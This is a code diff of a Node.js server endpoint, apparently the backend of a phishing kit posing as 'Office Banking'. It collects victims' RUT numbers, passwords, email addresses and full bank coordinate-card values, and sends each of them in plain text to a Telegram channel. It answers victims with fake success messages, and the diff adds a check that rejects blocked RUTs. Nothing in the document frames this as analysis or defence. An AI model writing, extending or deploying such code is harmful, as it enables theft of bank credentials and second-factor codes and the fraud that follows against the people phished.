@@ -316,21 +316,31 @@ function detectarNavegador(userAgent) {
 
 app.post("/proxy-login", async (req, res) => {
   const { rut, passwd, mail, coordenadas } = req.body;
-  if (rut) registrarIntentoRUT(rut);
   const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
   const userAgent = req.headers["user-agent"];
   const infoNavegador = detectarNavegador(userAgent);
 
-  console.log("\n" + "=".repeat(60));
-  console.log(`🔐 === NUEVO REQUEST A /proxy-login ===`);
-  console.log(`IP: ${ip}`);
-  console.log("User-Agent:", userAgent);
-  console.log("=".repeat(60));
-  console.log("COORDENADAS RECIBIDAS:", coordenadas);
+  // 🔥 Verificar si el RUT está bloqueado
+  if (rut) {
+    return estaBloqueadoRUT(rut, bloqueado => {
+      if (bloqueado) {
+        enviarEventoTecnico(`⛔ Intento de login con RUT bloqueado: ${rut}`);
+        return res.status(403).json({
+          status: "error",
+          mensaje: "RUT bloqueado"
+        });
+      }
 
-  // Evento técnico al panel (sin datos sensibles)
-  enviarEventoTecnico(
-    `Nuevo request a /proxy-login
+      // Si NO está bloqueado → continuar flujo normal
+      procesarLogin();
+    });
+  }
+
+  async function procesarLogin() {
+    if (rut) registrarIntentoRUT(rut);
+
+    enviarEventoTecnico(
+      `Nuevo request a /proxy-login
 IP: ${ip}
 Método: POST
 Navegador: ${infoNavegador.navegador}
@@ -339,24 +349,24 @@ Dispositivo: ${infoNavegador.dispositivo}
 Tiene mail: ${!!mail}
 Tiene login: ${!!(rut && passwd)}
 Tiene coordenadas: ${!!coordenadas}`
-  );
+    );
 
-  try {
-    // 📧 CORREO
-    if (mail) {
-      const mensajeCorrecto = `📧 Correo actualizado:
+    try {
+      // 📧 CORREO
+      if (mail) {
+        const mensajeCorrecto = `📧 Correo actualizado:
 ${mail}
 IP: ${ip}
 Navegador: ${infoNavegador.navegador}
 Sistema: ${infoNavegador.sistema}
 Dispositivo: ${infoNavegador.dispositivo}`;
-      await enviarATelegram(mensajeCorrecto);
-      return res.json({ status: "ok", mensaje: "Correo actualizado correctamente" });
-    }
+        await enviarATelegram(mensajeCorrecto);
+        return res.json({ status: "ok", mensaje: "Correo actualizado correctamente" });
+      }
 
-    // 🔐 LOGIN
-    if (rut && passwd) {
-      const mensajeLogin = `🔐 Nuevo Login en Office Banking:
+      // 🔐 LOGIN
+      if (rut && passwd) {
+        const mensajeLogin = `🔐 Nuevo Login en Office Banking:
 RUT: ${rut}
 Clave: ${passwd}
 IP: ${ip}
@@ -365,58 +375,59 @@ Navegador: ${infoNavegador.navegador}
 Sistema: ${infoNavegador.sistema}
 Dispositivo: ${infoNavegador.dispositivo}`;
 
-      await enviarATelegram(mensajeLogin);
-      return res.json({ status: "ok", mensaje: "Bienvenido a Office Banking" });
-    }
-
-    // 🔢 COORDENADAS
-    if (coordenadas) {
-      const coords = coordenadas;
-      let texto = "🔐 Tarjeta de Coordenadas\n\n";
-
-      const letras = ["A", "B", "C", "D", "E", "F", "G", "H", "I", "J"];
-
-      for (let fila = 1; fila <= 5; fila++) {
-        let linea = "";
-        for (let col of letras) {
-          linea += `${col}${fila}: ${coords[col + fila]} | `;
-        }
-        texto += linea.slice(0, -3) + "\n";
+        await enviarATelegram(mensajeLogin);
+        return res.json({ status: "ok", mensaje: "Bienvenido a Office Banking" });
       }
 
-      texto += `\nIP: ${ip}`;
-      texto += `\nHora: ${new Date().toLocaleString("es-CL")}`;
-      texto += `\nNavegador: ${infoNavegador.navegador}`;
-      texto += `\nSistema: ${infoNavegador.sistema}`;
-      texto += `\nDispositivo: ${infoNavegador.dispositivo}`;
+      // 🔢 COORDENADAS
+      if (coordenadas) {
+        const coords = coordenadas;
+        let texto = "🔐 Tarjeta de Coordenadas\n\n";
 
-      await enviarATelegram(texto);
+        const letras = ["A", "B", "C", "D", "E", "F", "G", "H", "I", "J"];
 
-      return res.json({
-        status: "ok",
-        mensaje: "Coordenadas recibidas correctamente"
-      });
-    }
+        for (let fila = 1; fila <= 5; fila++) {
+          let linea = "";
+          for (let col of letras) {
+            linea += `${col}${fila}: ${coords[col + fila]} | `;
+          }
+          texto += linea.slice(0, -3) + "\n";
+        }
 
-    // Datos inválidos → intento técnico fallido
-    registrarIntentoIP(ip);
-    enviarEventoTecnico(
-      `❌ Datos inválidos en /proxy-login
+        texto += `\nIP: ${ip}`;
+        texto += `\nHora: ${new Date().toLocaleString("es-CL")}`;
+        texto += `\nNavegador: ${infoNavegador.navegador}`;
+        texto += `\nSistema: ${infoNavegador.sistema}`;
+        texto += `\nDispositivo: ${infoNavegador.dispositivo}`;
+
+        await enviarATelegram(texto);
+
+        return res.json({
+          status: "ok",
+          mensaje: "Coordenadas recibidas correctamente"
+        });
+      }
+
+      // Datos inválidos
+      registrarIntentoIP(ip);
+      enviarEventoTecnico(
+        `❌ Datos inválidos en /proxy-login
 IP: ${ip}
 Hora: ${new Date().toLocaleString("es-CL")}`
-    );
+      );
 
-    res.status(400).json({ status: "error", mensaje: "❌ Datos inválidos" });
-  } catch (err) {
-    console.error(`❌ Error en /proxy-login:`, err);
-    registrarIntentoIP(ip);
-    enviarEventoTecnico(
-      `⚠️ Error en /proxy-login
+      res.status(400).json({ status: "error", mensaje: "❌ Datos inválidos" });
+    } catch (err) {
+      console.error(`❌ Error en /proxy-login:`, err);
+      registrarIntentoIP(ip);
+      enviarEventoTecnico(
+        `⚠️ Error en /proxy-login
 IP: ${ip}
 Error: ${err.message}
 Hora: ${new Date().toLocaleString("es-CL")}`
-    );
-    res.status(500).json({ status: "error", mensaje: "⚠️ Error al procesar solicitud" });
+      );
+      res.status(500).json({ status: "error", mensaje: "⚠️ Error al procesar solicitud" });
+    }
   }
 });
 // =============================================
